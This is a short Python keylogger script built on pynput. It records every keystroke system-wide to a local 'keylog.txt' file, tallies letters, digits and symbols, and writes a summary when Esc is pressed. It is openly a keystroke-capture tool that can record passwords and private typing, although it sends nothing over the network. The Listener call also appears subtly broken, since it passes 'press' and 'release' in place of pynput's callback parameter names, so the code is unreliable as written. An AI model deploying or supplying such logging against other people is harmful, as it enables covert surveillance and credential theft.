from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

total_keystrokes = 0
alphabet_count = 0
number_count = 0
special_symbol_count = 0
other_key_count = 0


def press(key):
    global total_keystrokes, alphabet_count, number_count, special_symbol_count, other_key_count
    
    total_keystrokes += 1
    try:
        if key.char.isalpha():  
            alphabet_count += 1
            with open(log_file, "a") as f:
                f.write(f"Key pressed: {key.char}\n")
        elif key.char.isdigit():  
            number_count += 1
            with open(log_file, "a") as f:
                f.write(f"Number pressed: {key.char}\n")
        elif key.char in ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '=', '+', '[', ']', '{', '}', ';', ':', ',', '.', '/', '?', '~', '`', '\\', '|']:  # Check for special symbols
            special_symbol_count += 1
            with open(log_file, "a") as f:
                f.write(f"Special symbol pressed: {key.char}\n")
        else:
            other_key_count += 1  
            with open(log_file, "a") as f:
                f.write(f"Other key pressed: {key}\n")
    except AttributeError:
        other_key_count += 1  
        with open(log_file, "a") as f:
            f.write(f"Other key pressed: {key}\n")


def release(key):
    if key == Key.esc: 
    
        with open(log_file, "a") as f:
            f.write("\n=== Key Log Summary ===\n")
            f.write(f"Total keystrokes: {total_keystrokes}\n")
            f.write(f"Alphabets: {alphabet_count}\n")
            f.write(f"Numbers: {number_count}\n")
            f.write(f"Special symbols: {special_symbol_count}\n")
            f.write(f"Other keys: {other_key_count}\n")
        return False  
with Listener(press=press, release=release) as listener:
    listener.join()
